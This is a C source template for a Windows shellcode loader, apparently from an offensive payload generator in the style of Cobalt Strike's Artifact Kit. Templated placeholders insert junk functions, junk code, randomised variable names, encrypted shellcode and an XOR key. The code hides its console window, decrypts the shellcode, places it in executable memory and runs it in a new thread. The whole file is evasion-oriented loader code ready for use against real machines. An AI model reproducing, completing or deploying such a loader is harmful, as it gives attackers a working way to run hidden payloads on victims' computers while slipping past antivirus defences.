#include <windows.h>

{{.JunkFunctions}}

// Artifact Kit Placeholder: Shellcode
unsigned char {{.VarShellcode}}[] = { {{.Shellcode}} };

int main() {
    // Junk Code
    {{.JunkCode}}

    // Hide console window
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    // XOR Decryption
    unsigned char {{.VarKey}} = {{.XorKey}};
    for (size_t i = 0; i < sizeof({{.VarShellcode}}); i++) {
        {{.VarShellcode}}[i] ^= {{.VarKey}};
    }

    LPVOID addr = VirtualAlloc(NULL, sizeof({{.VarShellcode}}), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (addr) {
        RtlMoveMemory(addr, {{.VarShellcode}}, sizeof({{.VarShellcode}}));
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
        if (hThread) {
            WaitForSingleObject(hThread, INFINITE);
        }
    }
    return 0;
}
